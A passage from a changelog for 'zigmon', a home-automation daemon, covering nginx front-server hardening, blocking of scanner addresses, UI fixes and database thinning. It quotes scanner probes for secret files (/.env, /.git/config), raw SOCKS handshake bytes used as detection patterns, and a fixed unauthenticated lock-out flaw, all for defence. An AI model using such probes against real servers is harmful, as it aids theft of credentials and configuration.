link, which is nobody's fault but ours. Weighing those would have kept the
owner out for the sin of the home server being asleep.

A failed handshake weighs 2, the lightest thing on the list, because one can
happen to anybody; it is the repetition that says something. The error log has
its own path, its own offset and its own rotation, and *Read it from the top*
starts both again. `zigmon --proxy` says whether it is being read.

4.6.4 — the front server's refusal was helping. A GET to `/tap` was answered

    405 {"ok":false,"error":"this address takes a POST carrying an
         X-Zigmon-Tap header"}

which tells somebody who was only guessing that there is something here worth
guessing at, and then names the very header they would need. It answers

    return 405 "";

and the `default_type application/json` above it is gone with it: nothing on
this road declares what is behind it. Whoever sent the wrong method already
knows they sent the wrong method.

`tools/probe-front.py` reads the body of that refusal now and warns when it
names a header, a token, a secret or an error - or simply carries more than a
few bytes of explanation. `test/nginx.py` refuses a release where the front
config answers a refusal with words that describe what is behind it.

4.6.3 — refusing the scanners at the handshake made them invisible to the
blacklist as well: a line that is never written cannot be weighed. So the
default blocks **close the connection and write the line first**.

    server { listen 443 ssl default_server; server_name _;
             ...the same certificate...
             access_log /var/log/nginx/zigmon-tap.log;
             return 444; }

From the caller's side 444 is exactly as quiet - the connection closes with no
answer at all - but nginx logs it, the daemon reads that log, and **444 in it
means "asked for the machine by its address, not by its name"**. Nobody does
that by accident: a person types the name, a watch has the name in its link.
It weighs 4, between a path that is not there and bytes that are not a
request, and the address goes on the list with everything else it has been
doing.

    45.9.148.7   4 in 10 min — 4× asked for the machine by its address,
                 not by its name, at the server in front

`ssl_reject_handshake` is still in the file, as the comment above the block:
the quietest possible answer, at the price of never counting who asked. Which
one you want depends on whether you would rather the scanners were invisible
or were on the list.

`test/taps.py` checks that five requests to the bare address earn a block and
that a press that worked is not weighed; `test/nginx.py` refuses a release
where the default block writes nowhere the daemon reads.

4.6.2 — yes, and it should have been that way from the start: the front
config now **answers to its name and refuses the bare address**.

nginx picks a server block by the Host header, and whatever is left over goes
to the *default* one. With only the real block in the file, that block was the
default - so `https://<the machine's address>/tap` was the road itself, and
every scanner that walks addresses rather than names found it. The log you
sent is full of exactly those.

Three layers now, in `deploy/nginx-tap-front.conf`:

    server { listen 443 ssl default_server; server_name _;
             ssl_reject_handshake on; }

**ssl_reject_handshake** refuses the TLS handshake when the name asked for is
not one this server knows: no certificate is offered, nothing is logged as a
request, and a scanner learns nothing at all. It wants nginx 1.19.4 or newer;
the comment says what to do on anything older. A second default block closes
port 80 the same way with `return 444`. And inside the real block, `if ($host
!= "mqtt.falco81.net") { return 444; }` catches the one case the other two
cannot - the right name in the handshake and a different one in the Host
header, which are chosen separately by whoever is asking.

`tools/probe-front.py` asks by address as well as by name where you give it
both - `probe-front 1.2.3.4 --host mqtt.falco81.net` - and says which of the
two answered. `test/nginx.py` refuses a release where the front config has no
default server, where the default does not refuse the handshake, where the
block carrying the links is itself the default, or where the Host is not
checked inside it.

4.6.1 — **What it costs** now carries a year, two years and three.

    THIS MONTH SO FAR    BY THE END OF THE MONTH    LAST MONTH
    382 Kc               739 Kc                     0 Kc
    58.8 kWh over 15.5 of 30 days

    A YEAR AT THIS RATE  TWO YEARS                  THREE YEARS
    8 987 Kc             17 975 Kc                  26 962 Kc
    1 383 kWh            2 765 kWh                  4 148 kWh

Worked out from what the sockets have counted so far this month - on that
house, 3.79 kWh a day - carried on, with the standing charge for each month
where one is set. The tooltip says how many days it is drawn from, because a
month three days old makes a rough year.

The same numbers are facts a message can say: `{a_day_kwh}`, `{year_kwh}`,
`{year_cost}`, `{year2_cost}`, `{year3_cost}` - so a monthly text can carry
"at this rate the year comes to ..." without anybody working it out.

4.6.0 — **the chart of what the house is drawing ended hours before the card
above it.** Three faults, found by chasing why the lights were on one and not
the other.

**The chart was built from the hourly table alone**, and that table is written
by the nightly fold - so on a real house it ran to six in the evening while
the readings ran to ten, and the whole of the evening was missing. The card
beside it is the moment itself, from the readings. The two could not agree
about the lights, or about anything else, for most of every day. The chart
takes the hourly figures where they exist and the readings themselves for
every hour since, which is what the device charts have always done.

**And when I fixed that, only the first socket in each hour counted.** The new
part skipped an hour that was already in the buckets - meant to leave the
folded hours alone, it also threw away every socket after the first in the
hours it was filling. The lights, alphabetically after nothing, went missing
exactly as before. It tracks which hours came from the fold instead.

**A reading older than the last one written overwrote it.** Inside the
sampling gap a reading replaces the row rather than adding one; a late
reading - one that arrives out of order - is not inside the gap, it is behind
it, and it was landing on the newest row and replacing its value. It is
written where it belongs now.

On the house's own data the chart now reaches the last hour there is, and its
lights line peaks at 48 W over a week where it used to be flat.
`test/tables.py` writes an hour and a half of a lamp and a fridge and refuses
a release where the chart stops short of the hour it is in, or where either of
them is missing from it.

4.5.4 — three more faults in the same layout, found by reading the rules
rather than the screen.

**A switch sat at the label line, not beside the boxes.** The bands put the
label first and the control second; a switch item is a row of label-and-switch
together, so it landed in the first band with everybody else's labels while
the boxes beside it were a band lower. Its label and its switch are pinned to
the second band now, level with the boxes.

**A section heading was one cell in a grid whose items are three bands each.**
It is a row of its own, spanning every column and exactly one band, so the
items after it start where they should.

**Each part is named to its band** - label first, control second, note third -
rather than taking whichever band its turn in the DOM gave it. An item with no
label, or one where the note arrived before something else, used to slide.

Honest about what I could check: jsdom does not implement `@supports
(grid-template-rows: subgrid)`, so none of these rules are live in the test
browser and I could not measure a single pixel of it here. What
`test/render.js` can do, and now does, is refuse a release where any of the
five rules that hold the layout together has gone missing. The rest wants a
look on a real screen.

4.5.3 — the yellow notes moved their neighbours. A settings item was a flex
column with the box at the bottom, so anything added to one - a note about
being taken over, or a label that ran to two lines - pushed its box up and
left the boxes in a row at four different heights. The Telegram chat id was
the obvious one, but it was every row with a note in it.

**Each item is three bands now - label, control, note - sharing the row's
tracks**, so an item with a two-line label and an item with a note and an item
with neither all put their boxes on the same line. A switch keeps its label
beside it and still takes one band; its note spans the whole row underneath.
The rules are scoped to the settings card, so the Wi-Fi and heating cards,
which use the same kind of item, are untouched.

`test/render.js` refuses a release where the items are not laid out in bands,
where a note on a switch row does not span it, or where an item has grown a
fourth part that three bands cannot hold.

4.5.2 — **4.5.0 got the marks backwards.** The card told a house with the
backups on that nothing is backed up, with the forecast on that the forecast
is off, with the blocking on that addresses are not kept out at all - and
dimmed the settings that were doing the work.

A switch on that card is a checkbox, and a checkbox's `value` is the word
**on** whether it is ticked or not. Every rule that asked whether a switch was
off read `+"on"` - not a number - and answered yes. So every switch-driven
rule fired, always. What it wanted was `checked`, and that is what it reads
now.

The notes were also squeezing in beside the switches, pushing a label and its
switch apart and breaking the grid. A note sits on its own line under the
whole row, whatever kind of row it is.

On a house where those things are switched on, the card now marks **27 of 110
settings**, every one of them genuinely taken over: the debug pair while the
log is off, the Duo six while Duo is not the second factor, the four lengths
while a ladder is set, the router's seven while there is no router, the
Telegram chat while there is no token.

`test/render.js` refuses a release where any switch that is **on** is marked
as unused, or where a setting governed by a switch that is on reads as
unused - which is the whole of the fault, stated as a rule.

4.5.1 — a reading for faults, leaks and lag over everything added this week -
the ladder, the router sheet, the idle marks, the new commands. **Nothing
found.**

On a real house's configuration and database, with a ladder set and every
secret filled in:

    137 reads a browser may make       none carries a secret
    POSTs with no PIN that acted       none
    the router read, to a browser      403; to the command line, 200

    status()                 2.0 ms      a week of one sensor   1.9 ms
    message_facts()          2.8 ms      blocked list           0.011 ms
    how blocking is worded   0.005 ms    reading the ladder     0.001 ms

The router sheet, the heaviest of the new things because it joins the router's
list with the story and the evidence for every address on it: **6 ms for
thirty addresses**, each card carrying eight lines of what that address did
and eight of what has happened to it.

Five threads reading the router sheet, the blocked list and the counters while
two more wrote samples: six tenths of a second, no fault, no growth, the
database intact.

4.5.0 — **every setting another one has taken over now says so**, not just the
four the ladder replaced.

A box that is being ignored and looks exactly like a box that is not is how
somebody sets a thing three times and wonders why nothing changed. Forty-odd
of them across the card, each dimmed with the reason underneath:

    not used while addresses are not kept out at all
    not used while there is no server in front
    not used while its log is not read by itself
    not used while there is no router
    not used while the router is not kept in step
    not used while the debug log is off
    not used while nothing is backed up by itself
    not used while the forecast is off
    not used while a head is left as it was set
    not used while nothing is warmed up early
    not used while a lost configuration is not noticed
    not used while nothing is asked for again
    not used while no second factor is asked for
    not used while Duo is not the second factor
    not used while there is no Telegram token
    not used while a block lasts for good
    not used while there is no ceiling
    not used while a ladder is set

The reasons are read in order and the broadest one wins, so a house with the
blocking switched off is told that rather than being told about a ladder it
also is not using. They follow a switch the moment it is flipped, before
anything is saved.

`test/render.js` refuses a release where fewer than ten settings say they are
being ignored, where one is dimmed without saying why, or where switching the
blocking off leaves *what earns a block* reading as though it were in use.

4.4.6 — **a value with no spaces in it ran out the side of the panel.** The
one that showed it was *never kept out*, whose value is a run of addresses with
commas and no breaks -
`192.168.40.0/24,2a02:7a00:0:1::8/125,2a02:7a00:e::/48,192.168.43.17` - and a
browser will not break a word unless it is told it may.

Told now, everywhere it matters: the help panel and everything in it, every
dialogue and everything in it, and the places that hold a value nobody chose
the length of - a key, a path, a log line, a name in a box. The panel is also
held to `min(420px, the window less a margin)`, so on a narrow window it no
longer reaches past the edge, and to the window's height with anything over
that clipped rather than drawn behind the page.

`test/render.js` refuses a release where the panel or a dialogue has no rule
for a word that does not fit, or where the panel can be wider than the window.

4.4.5 — the line under the blocked list said what would happen if nothing else
were set:

    blocking is set to temporary · 60 min ordinary, 4 h serious, doubling each
    time they come back

- on a house running a ladder, where all three of those numbers are ignored.
Telling somebody about settings that have been taken over is worse than
telling them nothing. It says what is in force:

    blocking follows a ladder: 10 min · 60 min · 24 h, then for good

The word *temporary* goes with it, because a ladder ending in *for good* is
not temporary and the mode no longer decides. Without a ladder it reads as
before, and the serious length is worked out the same way the daemon works it
out rather than being assumed to be four hours.

And on the same card, *Read the router now* and *Forget what they have been
doing* have swapped places: reading the router is something to do often, and
forgetting what everybody has been up to is not something to have under the
pointer on the way there.

4.4.4 — a real house's blocking settings, read off a screenshot, showed four
boxes doing nothing and looking exactly like the ones that were.

**A ladder answers the whole question of how long.** With one set, *how long a
block lasts*, *how long a temporary block lasts*, *a serious one lasts* and
*double it each time they come back* are all ignored - and they sat there
looking ordinary, which is how somebody sets a length that is never used and
then wonders why nothing changed. They dim while a ladder is set, and say **not
used while a ladder is set** underneath. Clear the ladder and they light up
again.

`test/render.js` refuses a release where any of the four still reads as in use
with a ladder set, or reads as unused without one.

4.4.3 — you asked whether I had actually run them. I had read the help against
the flag list and checked that neither mentions something the other lacks -
which is not the same thing, and is exactly how `--help` itself went silent in
4.4.1 while every check passed: the file was still valid Python and nothing
tried it.

So they are run now. **`test/cli.py`** starts a daemon on a port and a database
of its own and executes **39 commands** - every one in the help that only reads,
each of the three that take `--json`, and the help itself. A traceback, a name
that is not defined, an exit code nobody expects, or a command that cannot
reach the daemon it was just given is a failure. What a command *says* about an
empty house - *no rules*, *nobody is blocked*, *no room is set up for heating* -
is a fine answer and is not judged.

It starts the API in-process rather than running the daemon, because the daemon
refuses to start without the MQTT library and a machine that only runs the
checks has no reason to have it. What is being checked is the command line.

Run by hand for this release, and all of them answered: the twenty-three
reading commands, the fifteen that talk to hardware or the gateway, and the
seven that change something with `--pin` - *block_minutes is now 45*, *blocked
203.0.113.77*, *took 1 off the list*, *Backup written to /tmp/backups*.

4.4.2 — the ladder was a box to type a list into, which is a box to make a
mistake in: one comma out of place and a house keeps somebody out for a
thousand days. It is built from its steps now.

A dropdown of ready-made ones first - *10 min · 1 h · 1 day · for good*,
*1 h · 1 day · 1 week · for good*, *1 day then for good*, or no ladder at all -
and under it the steps themselves, one row each, every length chosen from a
list rather than typed: five minutes to thirty days, and **for good**. A step
can be taken away; one can be added, and the next one starts at four times the
last, which is usually what somebody wants.

Choosing **for good** ends the ladder there and drops anything after it,
because nothing can happen after for good - and *Add a step* goes quiet for
the same reason. Under it all, the ladder in words as it will behave:

    1st 10 min · 2nd 1 hour · 3rd 1 day · 4th for good

What is stored is the same comma-separated list the daemon has always taken,
so nothing behind the page changed. `test/render.js` refuses a release where
the ladder is a text box, where a preset writes the wrong value, or where
anything survives after *for good*.

4.4.1 — the help, gone through command by command. **Twenty-three commands
were in the program and in no list anywhere** - the network map, the Wi-Fi
dump, the modem, the gateway, `--what-if`, `--tell`, `--diagnose`,
`--check-sms`, `--acl`, `--monthly`, `--battery`, `--weather`, `--targets`,
`--switch`, `--taps`, `--taps-test`, `--secret`, `--wifi-probe`, and the rest.
A command nobody lists is a command nobody uses.

Every one of them is in it now, under eight headings:

    Looking at the house        Watching it work
    Switching things            Who may talk to it
    How it is set up            When something is wrong
    Keeping it well             Talking to a Shelly directly

The examples carry their modifiers where the modifier is the point -
`--history ... --range 7d --keys temperature,humidity`, `--watch --bridge
--raw --seconds 30`, `--plug-pulse ... --ms 3000`, `--settings
block_minutes=180 --pin 1234` - so the flags that only make sense after a
command are shown being used rather than listed on their own.

`test/endpoints.py` now refuses a release where any command is not findable in
the help at all, as an example of its own or named in the words beside
another. Three were left findable only in another line's description - the
two other ways to switch a plug, and the Wi-Fi card order by its second name -
and each of those lines says so.

While in there: I cut the file in half with a careless splice, `--help` went
silent, and I put it back from the 4.4.0 package and did it again by hand.
That is what the packages are for.

4.4.0 — **Read the router now**: a button on the blocked card that logs into
the router, reads its address list - both families - and shows every address
on it with everything this house knows beside it.

The two halves have always been in different places. The list on the router is
the truth about what is actually being stopped; the reason, the ladder step
and the lines that earned it live here. Neither means much alone, and
comparing them by eye is nobody's idea of a evening.

One card per address, in the style of the alert sheet:

    185.234.9.7   IPv4 · 🌐 seen at the server in front · carried
    5 in 10 min — 5× a path that is not there, at the server in front

    KEPT OUT SINCE  HOW LONG LEFT  WHY THAT LONG                         
    09:13           23 h           the third time from this address: 24 h
    TURNED AWAY     PUT THERE BY   KEPT OUT BEFORE   ON ITS ACCOUNT NOW  
    14×             the counting   2×                28 of 15            

    WHAT IT DID — THE LAST 8 OF THEM, AS THEY ARRIVED
    10:12:15  GET /.git/config   — a path that is not there
    10:12:05  GET /.env          — a path that is not there

    EVERYTHING THAT HAS HAPPENED TO IT
    09:13  ⛔ kept out — 5 in 10 min · by itself
    08:11  ✅ let back in — ran out · by itself

Three kinds of card: **carried** (on the router and kept out here), **somebody
else put it there** (on the router, not ours, and left alone), and **not on
the router** - kept out here and the router has no rule for it, which is the
half nobody sees until a rule does not fire. The evidence is the same whether
the address earned it at the API or in the proxy's log, since both end in the
same weighing.

Nothing on it changes anything. `test/render.js` draws all three kinds from a
stand-in answer and checks the marks, the evidence, the story and the fields.

4.3.0 — **a ladder, written out**: ten minutes the first time an address is
kept out, an hour the second, a day the third, for good after that.

    block_ladder:  10, 60, 1440, forever

That is the whole of the answer where one is written - it replaces the lengths
and the doubling. Something serious takes the step after the one it would have
had, so a wrong secret on a first visit gets the hour rather than the ten
minutes. Past the end the last step repeats, unless the list ends in
*forever*. Empty, and the lengths and doubling of 4.2.0 decide as before.

**And every blocked address now says why it is that long.** Under the reason
it was kept out:

    ⏱ the third time from this address: 24 h · kept out 2× before
    ⏱ the first time from this address, and serious: 60 min

Worked out at the moment the block was made and kept with it, rather than left
for somebody to reconstruct from the settings - which is the difference
between a list you can read and a list you have to interpret.

`test/taps.py` walks the ladder five times and checks each rung, that a
serious first visit takes the second rung, and that the row says how it was
decided.

4.2.0 — **how long a block lasts now depends on what earned it, and on
whether that address has been here before.** Until now every block was the
same hour, whether it came from a crawler walking paths that are not there or
from somebody working at a lock.

**By what earned it.** A wrong secret, a wrong six-digit code, something the
server in front refused, and bytes that are not a request at all - a SOCKS
handshake, a scanner's calling card - are *serious*: a browser cannot send
them by accident and a person cannot type them. A path that is not there is
*ordinary*. Serious keeps an address out four times as long, or whatever
**block_minutes_serious** says; left at 0 the two stay in proportion, so
moving the ordinary one moves both.

**By coming back.** With **block_repeat** on - as it comes - an address kept
out before is kept out twice as long the next time, and twice as long again
after that:

    1×  60 min      3×  4 h       5×  16 h
    2×  2 h         4×  8 h       6×  32 h

The count comes from the story of that address, so it survives a restart and
is wiped when the story is erased. **block_max_minutes** is the ceiling - a
week as it comes - and **block_over_max** decides what happens there: hold it,
or stop counting and keep that address out for good.

All of it applies the same way to what the API sees and to what is read out of
the proxy's log, because both end in the same weighing. The blocked card says
what the next one would cost - *60 min ordinary, 4 h serious, doubling each
time they come back* - so the settings are visible in what they do.

4.1.0 — a day of a real proxy log, read line by line to see what the weighing
misses. It reads **1,858 of 1,871 lines** and keeps seventeen addresses out;
the thirteen it could not read were the most interesting ones in the file.

**A whole class of caller speaks no HTTP at all.** nginx writes the raw bytes
it was sent and answers 400, and the pattern - which looks for a method and a
path - saw none of it:

    "\x05\x01\x00"                      a SOCKS 5 handshake
    "\x04\x01\x00P\x01\x01\x01\x01\x00"      a SOCKS 4 handshake
    "MGLNDD_195.189.0.26_443"          a scanner's calling card
    "\x12\x01\x00/\x00\x00\x02..."           a database protocol prelogin

Somebody checking whether the server is an open proxy was the one visitor the
house never noticed. Those lines are weighed now, at five - more than a path
that is not there, because a browser cannot send them by accident and a person
cannot type them. Three of them in ten minutes earns a block; one does not,
because a mistyped `http://` on an HTTPS port looks the same from here.

On the day's log: the address that tried SOCKS twice and again is kept out,
and the ones that sent a single odd packet are left alone. Everything else is
as it was - the scanner walking 272 different paths, the one walking 166, and
the nine others; the house's own addresses spared; a phone that pressed a link
successfully never weighed.

`test/taps.py` carries those lines, so the class stays visible.

4.0.1 — a reading for faults, leaks and lag after the new commands. One
finding, cosmetic but the sort that teaches the wrong thing.

**`zigmon --settings` printed a password as `True`.** The daemon never sends a
secret's value, only whether one is set - which is right - and the command
line printed that answer as though it were the value. It says **set** or **not
set** now, and `test/endpoints.py` refuses a build where it tries to print the
last letters of something that is not the secret.

Nothing else found. Measured on a real house's database, 4.1 million samples
and 65 devices:

    status()                  1.6 ms      a week of one sensor   3.2 ms
    message_facts()           2.2 ms      twelve charts at once  0.1 ms
    blocked list, approvals, notification settings   too small to measure

The first read of a week's chart after a cold start takes half a second while
SQLite pulls pages off a 485 MB file; every one after it is three
milliseconds. Five threads reading the status, the charts and the alerts while
two more wrote samples: half a second, no fault, no growth, the database
intact.

On the security side, unchanged and checked again: 136 reads a browser may
make and not one carries a password, a router key or the PIN - a secret
setting says only whether it is set; no POST acts without the PIN; a made-up
session still locks nothing.

4.0.0 — **nine commands for things that had no command**, and a help page
somebody can read.

    zigmon --settings                 every setting it is running with
    zigmon --settings block           the seven with "block" in the name
    zigmon --settings block_minutes=180   change one, asking for the PIN
    zigmon --alerts                   every kind of message, where it goes,
                                      and the ones written by hand
    zigmon --heating                  every room, asked against actual
    zigmon --people                   who the house knows, and who is in
    zigmon --scenes                   the scenes and the schedules
    zigmon --sessions                 who has editing unlocked, and from where
    zigmon --backup                   the backups there are; --backup now
    zigmon --run-script Ban --text ip=1.2.3.4

`--settings` is the one I have been telling people to use for a week without
its existing. `--alerts` is the sheet from the dashboard, in the terminal,
with the roads coloured: green where a kind has roads of its own, red where it
is said nowhere, grey where it follows everything else.

**And the help is in sections** - *Looking at the house*, *Doing something*,
*Who may talk to it*, *How it is set up*, *Keeping it well* - each heading in
colour when the terminal takes colour. It had grown to sixty flags in one
list, which is a list nobody reads.

`test/endpoints.py` refuses a release where the help offers a flag the command
line does not have, or where the headings have gone.

3.99.3 — **the *Unlock editing* button on the Public API tab took two clicks**
about as often as one.

That tab asks the daemon for its lists once a second, and while editing is
locked every one of those is refused. Each refusal drew the locked note again
- which threw the button away and put a new one in its place. A press that
landed in the wrong tenth of a second released over a button that no longer
existed, so nothing happened and the second try worked.

Nothing in that note changes from one second to the next, so it is drawn once
and left alone until it is no longer the right note. `test/render.js` refuses
a release where three refusals in a row replace the button.

3.99.2 — the sheet left out **the alerts written by hand**, which is most of
what a house actually says. It listed the kind - *a written alert of your own*
- and not one of the ones you wrote.

They are on it now, under *Written by you, under Messages*, each with its own
name, how serious it is, **the roads it takes** (chosen on the message itself,
not inherited from anywhere), who the text goes to where one is named, how
long the same one is held back before it repeats, and **its own words** in
place of an example - because for these the words are the thing.

    Freezer warming        serious   [ntfy · Telegram · SMS · to +420 777 …]
    The freezer is warming
    Temp-Mrazak is above 0 °C

A heading fix came with it: the name and the level pill ran together into one
word, because a heading lays its children out with a gap between them and a
bare piece of text is not one of them.

`test/render.js` refuses a release where the sheet leaves the hand-written
alerts out, or shows a different number of them than there are.

3.99.1 — the Notifications card said the four sections were read one way and
the daemon read them another. **Section 2 says it has to say yes before
anything is sent; it has never applied to anything but devices.** A failed
backup, an address kept out or somebody coming home is sent because its kind
is on in section 3, whatever the switches in 2 say - which is right, and was
nowhere written down.

Each section now states what it actually governs, and a line above them all
gives the order: 1 says which roads exist, 2 what is worth saying about a
device, 3 gives one kind its own roads or silences it, 4 does both for one
device. Hushing beats all four. The sheet repeats it in full for the kinds it
lists.

3.99.0 — **eight more kinds of message, each able to take a road of its own**,
and a sheet showing every one of them.

An address being kept out used to travel as *anything else the house says* -
in with a bridge restart and a stray log line, which is no way to tell them
apart when one of them means somebody is trying the door. The kinds are now:

    an address kept out          a one-tap link
    editing and keys             the router that carries the list
    the server that faces the internet
    heating                      Wi-Fi and who is home        the text gateway

Eighteen kinds altogether, each with its own three switches under *A different
road for one kind of message*, and the messages that belong to them now say
which they are: a block, the router refusing the list, the proxy log that
could not be read.

**And a sheet: *Every kind of message*.** One card per kind, what it covers,
which roads it takes - dashed where it follows the choice made for everything,
and *said nowhere* where it is switched off - and **an example of each,
written the way the house would write it**:

    An address was blocked
    185.234.9.7 — 5 in 10 min: 5× a path that is not there, at the
    server in front. Out for an hour.

Eighteen kinds, eighteen examples, nothing on it that changes anything.
`test/render.js` refuses a release where the sheet and the card disagree about
how many kinds there are, where a kind shows no example, or where an address
being kept out is not a kind of its own.

3.98.2 — a reading for faults, lag and leaks, run against a real house's
configuration and database with a PIN set. Two findings, both on the security
side, neither of them an opening into the house.

**One unauthenticated request could log every editor out.** `/api/lock` asks
for no PIN - the page uses it to lock its own session - and handed a token it
did not know, it cleared *every* session rather than none. Anything that could
reach the relay could send one made-up token and lock the owner out of
editing on every screen and phone at once. A token nobody issued now locks
nothing; a real one locks only itself. Locking everything is what *Lock all
sessions* is for, and that asks for the PIN. The endpoint still answers ok to
the page but says whether anything was locked.

**The proxy's own read was open to every browser** while the router's was not.
It names the log path and the public key, neither a secret, but it is
configuration and now sits behind the same PIN as `/api/mikrotik`. The command
line with the token reads it as before.

Measured and clean: 136 reads answered to a browser with no PIN and not one of
them leaked; no other POST acted without a PIN; the reads that hold passwords
refuse a browser and answer the command line. Over the API on that database:
the status six milliseconds, a week of a sensor's chart one, two hundred
events one, the device list four. Five threads writing samples, reading the
status and charts, weighing the proxy log and syncing the router all at once:
two tenths of a second, no fault, memory up one megabyte, the database intact.

3.98.1 — a reading of the whole of it after yesterday's change to the writer.
One thing found, in the corner where the two rules meet.

**With a sample_interval set, the memory of what is stored did not follow what
was stored.** A reading arriving inside the gap replaces the row rather than
adding one; the writer went on remembering the value it had *inserted*, so a
later reading equal to the value that had since been replaced would have been
skipped as a repeat of something no longer in the database. It follows the
replacement now. `test/tables.py` walks that corner.

Everything else came out well. A day of forty devices reporting every thirty
seconds: **7,680 rows written where 230,400 would have been**, in half a
second, with a drifting sensor charting its full range and a flat one still
charting a point every quarter of an hour. The writer remembers one entry per
series - 687 of them on a real house, about eighty kilobytes. An energy
counter, which changes every reading, is written every reading. The hourly
fold works on the thinner data and takes no measurable time.

A real day of a real SMS gateway, replayed through the new writer: 72,566 rows
became **10,214**.

3.98.0 — better than clearing it out afterwards: **not writing it down**.

A reading equal to the last one written for that series is skipped until the
anchor is due - a quarter of an hour, as it comes, in **sample_anchor_s**. A
flat line still gets a point that often, so a chart has something to draw and
every hour still has rows to fold into the hourly table. A reading that
differs by **any amount at all** is written the moment it arrives.

    an hour of a sensor reporting every 30 s, flat then a step:
      before   120 rows
      now        4 rows, both values kept, the step at the right second

Nothing else changes, and that is the point of doing it here: the live
reading, the rules, the alerts, the switches and the notifications all work
from what arrived, not from what was written down. The samples table is the
history and only the history. Set it to 0 and every reading is written as
before.

On the house whose database started this - 4.1 million rows in a fortnight,
sixty-two per cent of them repeats - this is where those rows stop being
written in the first place. *Clear out noise* is still there for what is
already in the database.

`test/tables.py` writes an hour of a flat series with a step in the middle and
refuses the release if a value is lost, if the moment of the change moves, if
the chart loses its range, or if turning the anchor off stops writing
everything.

3.97.8 — a reading of a real house's database, 508 MB and a fortnight old.

**Eighteen per cent of every row in it was a value that never changed once** -
an IMEI written down 15,509 times, a SIM slot count 14,870 times, a plug's
returned-energy total 14,592 times. Sixty-two per cent was a row saying
exactly what the row before it said.

*Clear out noise* knew about that and looked only at the gateway's own series,
which is where it was first noticed. It looks at every series now. A run of
identical values keeps its **first and its last** - which is what a flat line
on a chart is made of - and an anchor every fifteen minutes so a long flat
stretch still has points in it.

On that house's database: **4,097,215 samples down to 1,540,847** in two
minutes, with every chart keeping its shape - the same range, the same
readings, fewer points only where the line was flat. The space is given back
to the disk by *Optimise* afterwards, which is what that button is for.

Everything else measured at that scale came out well: the status two
milliseconds, a week of one sensor's chart fourteen, twelve sensors at once
under one, the blocked list and the press log too small to measure, the
nightly tidy two tenths of a second. `PRAGMA quick_check` says ok.

`test/tables.py` builds a flat series with a step in the middle, clears it,
and refuses the release if the chart's shape changes.

3.97.7 — **the clock never asked for the proxy log to be read.** Yesterday's
reading of a real house said it had worked; `zigmon --proxy --test` on that
house said *last read 6.3 h ago* with everything set up and a key held, and
that is the whole of it: `_proxy_quietly` was written, the settings were
there, the key was there, the SSH worked - and nothing called it. A house that
had set the whole thing up read its log once, by hand, and never again.

The hook is in the minute loop where it always should have been, beside the
router's. It reads as often as **proxy_every** says, one reading at a time.

The only sign of this was an empty blocked list, which is also what a quiet
week looks like - which is why it took a database and a command that says
*last read* to find. `test/taps.py` now refuses a build where the reading of
the proxy log, or the router sync, is written but never started from the
clock: a function nobody calls is a particular kind of nothing, and it looks
exactly like a feature that works.

3.97.6 — a reading of a real house's database answered the question about the
proxy log: **it was working all along.** At 15:38 it read 677 lines, weighed
14 addresses and kept five of them out - the ones walking `/.env`,
`/.git/config` and `/phpinfo.php` - each with *seen at the server in front*
beside it. At 16:38 all five were let back in, because a block lasts an hour
unless the settings say otherwise. The list was looked at in the evening and
was empty, which is exactly what a working afternoon leaves behind.

Two things came out of the reading anyway.

**A reading that finds nothing now says so**, once every few hours. Silence
from *nothing worth weighing came in* and silence from *it stopped reading*
looked identical, and that is what sent somebody hunting a fault that was not
there.

**And a reading cannot pile up on itself.** The SSH has its own timeout, but a
proxy answering slowly while a reading is asked for every minute would have
started a thread a minute, each from an offset the one before had not finished
writing. Five readings asked for at once now send **two** commands to the
proxy - one stat, one tail - and the offset lands where the log ends.

Worth knowing for a house that wants scanners kept out for longer than an
hour: `block_minutes`, or `block_mode: permanent`, in *Keeping addresses out*.

3.97.5 — **`zigmon --proxy`**: whether the log of the server in front is being
read, and why not when it is not.

    The server that faces the internet
      set up        yes
      reading it    no - turn proxy_watch on in Settings
      the log       /var/log/nginx/zigmon-tap.log
      a key         none - it logs in with a password
      last read     never

`--proxy --test` reads the last few lines there and then and says what came
back, or why it could not: *no private key is stored yet*, *permission
denied*, *no such file*. With a failure it lists the three things that usually
go wrong, in the order they usually go wrong. Until now the only sign that
nothing was being read was that nothing appeared on the blocked list, which is
also what a quiet week looks like.

The reading of the log was checked against a real afternoon of a public nginx
log: **1200 of 1209 lines read**, 43 addresses weighed, nine of them kept out
including the ones walking `/.env`, `/.git/config` and `/phpinfo.php`. A
successful press was not weighed against the phone that made it. Ten lines of
that log are in `test/taps.py` now, so the pattern is held to a log that
really happened rather than one I made up.

The harmless *test* reading is allowed to the command line on this machine
holding the API token, since it changes nothing and that machine can read the
log over SSH itself; making, taking or forgetting a key, and weighing a whole
reading, still want the PIN.

3.97.4 — a reading for faults after a week of work on the page. Two found.

**The sweep was walking the whole page every time anything changed.** The page
redraws every second, and finding the three elements that are new by looking
at four hundred cost more than the drawing did: measured at 323 ms over four
seconds of a live page, and 152 ms for twenty hovers, because showing the help
panel is itself a change to the page and asked for another sweep. It now looks
only at what was just added, and ignores anything the panel does to itself:
**87 ms** over the same four seconds, **8 ms** for the same twenty hovers.

**And a setting no card drew at all.** `heating_enforce_min` - how long a head
turned by hand at the radiator keeps that setting before the house puts its
own back - has been in the daemon since enforcement went in and on no card
ever, so the only way to set it was to write it into config.json by hand,
which nobody discovers. It is in Heating now. `test/inputs.py` refuses a
release where any setting the daemon takes is drawn nowhere.

Checked while there: the page draws 103 settings, every one of them known to
the daemon, none drawn twice, none missing from the status.

3.97.3 — you were right that it was half a job. The sweep upgraded what had a
long title and I had written out the buttons and the dropdowns by name; every
box, switch, file picker and filter field in the application still said
nothing.

A reading of every control on every tab and section found **about ninety**
with no word about them. There are **six** now, and each of those is a
one-off with no name of its own.

Covered three ways, because writing ninety sentences by hand is how ninety
sentences go stale in ninety different ways:

- **By family.** An *Add* button is an *Add* button in eleven cards: a new
  empty line, here on the page only, nothing written down until the card is
  saved. A *Save* button writes that card down, puts it to work at once and
  asks for the PIN. An *Erase* button says that what it erases comes back only
  from a backup. A box with a placeholder says what the placeholder is an
  example of; a file picker says nothing happens until a file is chosen.
- **By name**, for the Wi-Fi and access-point card, whose sixteen boxes had
  nothing: which address, which port, why a read-only user is enough, why a
  phone asleep in a pocket is what the grace period is for, that the ntfy
  topic is a word anybody who knows it can use to say you are home.
- **From what the card already knows.** The SMS gateway's fields each carry a
  note under the box; that note is now in the panel as well, with the key that
  field has in **config.json** and what the file says for it, exactly as
  Settings does.

`test/render.js` refuses a page where more than eight named controls say
nothing about themselves.

3.97.2 — the buttons and the dropdowns, which the sweep could not help with:
it upgrades what already has a long title, and these had none at all.

**Every dropdown in the application now says what choosing something in it
